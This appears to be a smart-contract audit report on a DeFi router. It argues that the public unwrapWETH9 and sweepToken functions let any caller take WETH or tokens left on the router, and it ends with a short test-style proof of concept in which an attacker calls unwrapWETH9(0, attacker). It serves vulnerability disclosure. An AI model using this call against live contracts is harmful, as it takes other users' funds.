Audit Report

## Title
Public `unwrapWETH9` with no caller binding drains entire router WETH balance to attacker-chosen recipient — (`metric-periphery/contracts/base/PeripheryPayments.sol`)

## Summary
`unwrapWETH9` is `public payable` with no access control and no per-user accounting. It reads the router's full WETH balance, withdraws it all via `IWETH9.withdraw`, and forwards the resulting ETH to a caller-supplied `recipient`. Any address can call it with `amountMinimum = 0` and redirect the entire router WETH balance to themselves. `sweepToken` has the identical flaw for ERC-20 outputs.

## Finding Description
The function at `PeripheryPayments.sol` L37–45 reads `IERC20(WETH).balanceOf(address(this))`, checks only that it meets `amountMinimum` (which the attacker sets to `0`), then unconditionally withdraws and transfers the full balance to the caller-supplied `recipient`:

```solidity
function unwrapWETH9(uint256 amountMinimum, address recipient) public payable override {
    uint256 balanceWETH = IERC20(WETH).balanceOf(address(this));
    if (balanceWETH < amountMinimum) revert InsufficientWETH(amountMinimum, balanceWETH);
    if (balanceWETH > 0) {
        IWETH9(WETH).withdraw(balanceWETH);
        _transferETH(recipient, balanceWETH);
    }
}
``` [1](#0-0) 

The intended usage pattern is a two-step `multicall`: `exactInputSingle(recipient=router)` followed immediately by `unwrapWETH9`. Because `multicall` uses `delegatecall` into the same contract, the WETH balance is shared across all callers and steps within a single transaction. [2](#0-1) 

This pattern is safe only when both calls are atomic in the same `multicall`. When a user issues them as separate transactions, or when any WETH residue is left on the router from a reverted or partial multicall step, the balance is unprotected and claimable by any caller. There is no `msg.sender` check, no per-depositor ledger, and no minimum amount guard when `amountMinimum = 0`.

`sweepToken` has the identical issue for ERC-20 outputs: [3](#0-2) 

By contrast, `refundETH` correctly restricts the recipient to `msg.sender`: [4](#0-3) 

## Impact Explanation
Direct theft of user ETH output. An attacker calls `unwrapWETH9(0, attacker)` in a standalone transaction whenever the router holds a nonzero WETH balance. The entire balance is withdrawn and sent to the attacker; the victim receives nothing. Loss is 100% of the stranded WETH with no floor. This is direct principal loss meeting the High severity threshold.

## Likelihood Explanation
- The function is `public` with zero prerequisites — no role, no token ownership, no prior deposit.
- Any mempool observer can detect a pending `exactInputSingle(recipient=router)` transaction and front-run the victim's `unwrapWETH9` call.
- Even without front-running, any WETH residue left by a reverted or partial multicall step is permanently claimable by anyone.
- The attack is repeatable on every transaction where WETH transiently lands on the router.

## Recommendation
Restrict `unwrapWETH9` and `sweepToken` so that only `msg.sender` can be the `recipient` (i.e., enforce `recipient == msg.sender`), mirroring the existing `refundETH` pattern. Alternatively, track per-user WETH deposits in transient storage during the swap callback and only allow withdrawal of the amount attributed to the current caller.

## Proof of Concept
```solidity
function test_attacker_steals_victim_weth_output() public {
    // 1. Victim swaps token1 -> WETH, output goes to router
    vm.prank(victim);
    router.exactInputSingle(ExactInputSingleParams({
        ...,
        tokenOut: address(weth),
        recipient: address(router),   // WETH lands on router
        ...
    }));

    uint256 routerWeth = weth.balanceOf(address(router));
    assertGt(routerWeth, 0);

    // 2. Attacker front-runs victim's unwrapWETH9 call
    uint256 attackerEthBefore = attacker.balance;
    vm.prank(attacker);
    router.unwrapWETH9(0, attacker);   // amountMinimum=0, recipient=attacker

    // 3. Attacker receives victim's ETH; victim gets nothing
    assertEq(attacker.balance - attackerEthBefore, routerWeth);
    assertEq(weth.balanceOf(address(router)), 0);
}
```

### Citations

**File:** metric-periphery/contracts/base/PeripheryPayments.sol (L37-45)
```text
  function unwrapWETH9(uint256 amountMinimum, address recipient) public payable override {
    uint256 balanceWETH = IERC20(WETH).balanceOf(address(this));
    if (balanceWETH < amountMinimum) revert InsufficientWETH(amountMinimum, balanceWETH);

    if (balanceWETH > 0) {
      IWETH9(WETH).withdraw(balanceWETH);
      _transferETH(recipient, balanceWETH);
    }
  }
```

**File:** metric-periphery/contracts/base/PeripheryPayments.sol (L48-55)
```text
  function sweepToken(address token, uint256 amountMinimum, address recipient) public payable override {
    uint256 balanceToken = IERC20(token).balanceOf(address(this));
    if (balanceToken < amountMinimum) revert InsufficientToken(token, amountMinimum, balanceToken);

    if (balanceToken > 0) {
      IERC20(token).safeTransfer(recipient, balanceToken);
    }
  }
```

**File:** metric-periphery/contracts/base/PeripheryPayments.sol (L58-63)
```text
  function refundETH() external payable override {
    uint256 balance = address(this).balance;
    if (balance > 0) {
      _transferETH(msg.sender, balance);
    }
  }
```

**File:** metric-periphery/contracts/MetricOmmSimpleRouter.sol (L39-44)
```text
  function multicall(bytes[] calldata data) public payable override returns (bytes[] memory results) {
    results = new bytes[](data.length);
    for (uint256 i = 0; i < data.length; i++) {
      results[i] = Address.functionDelegateCall(address(this), data[i]);
    }
  }
```
